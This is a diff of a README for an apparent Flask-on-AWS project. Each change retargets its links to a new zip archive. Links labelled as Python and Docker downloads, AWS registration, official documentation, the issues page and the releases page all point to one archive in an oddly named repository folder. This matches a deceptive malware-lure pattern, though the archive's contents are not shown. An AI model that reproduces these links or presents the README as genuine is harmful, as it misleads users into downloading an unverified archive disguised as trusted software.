@@ -4,14 +4,14 @@ Welcome to the aws-mini-web-app! This application helps you effortlessly run a F
 
 ## 📦 Download Now
 
-[![Download aws-mini-web-app](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip%https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)
+[![Download aws-mini-web-app](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip%https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)
 
 ## 🚀 Getting Started
 
 To get started, you will need to download the application from our Releases page. Follow the steps below. 
 
 1. **Visit the Release Page**
-   - Click this link to visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip).
+   - Click this link to visit the Releases page: [Visit Releases Page](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip).
    - You will find different versions of the application there.
 
 2. **Select the Latest Version**
@@ -37,8 +37,8 @@ Before installing, ensure your system meets the following requirements:
 
 If you do not have Python or Docker, please follow these links to download them:
 
-- [Download Python](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)
-- [Download Docker](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)
+- [Download Python](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)
+- [Download Docker](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)
 
 ## 📂 Features
 
@@ -55,7 +55,7 @@ The aws-mini-web-app comes packed with various features:
 To fully utilize the aws-mini-web-app, you will need to set up your AWS account. Here's what you need to do:
 
 1. **Create an AWS Account**
-   - Go to [AWS Registration](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip).
+   - Go to [AWS Registration](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip).
 
 2. **Set Up Required Services**
    - You need to enable the following services for the application to work:
@@ -79,7 +79,7 @@ If you encounter any issues while running the app, here are some solutions:
 
 ## 📈 Support 
 
-If you need further help, please explore our documentation or reach out via the GitHub Issues page linked here: [Report Issues](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip). 
+If you need further help, please explore our documentation or reach out via the GitHub Issues page linked here: [Report Issues](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip). 
 
 ## 💬 Community Contributions
 
@@ -89,12 +89,12 @@ We welcome contributions! If you wish to improve this application or document, f
 
 Here are some useful links:
 
-- [Flask Documentation](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)
-- [AWS Documentation](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip)
+- [Flask Documentation](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)
+- [AWS Documentation](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)
+- [Docker Documentation](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip)
 
 ## 📥 Download & Install
 
-To get the software, visit the Releases page again: [Download from Releases](https://raw.githubusercontent.com/zerobyte2/aws-mini-web-app/main/Bombacaceae/aws-mini-web-app.zip). Follow the steps mentioned above. 
+To get the software, visit the Releases page again: [Download from Releases](https://github.com/zerobyte2/aws-mini-web-app/raw/refs/heads/main/Bombacaceae/app-mini-web-aws-v3.0.zip). Follow the steps mentioned above. 
 
 Thank you for using aws-mini-web-app!
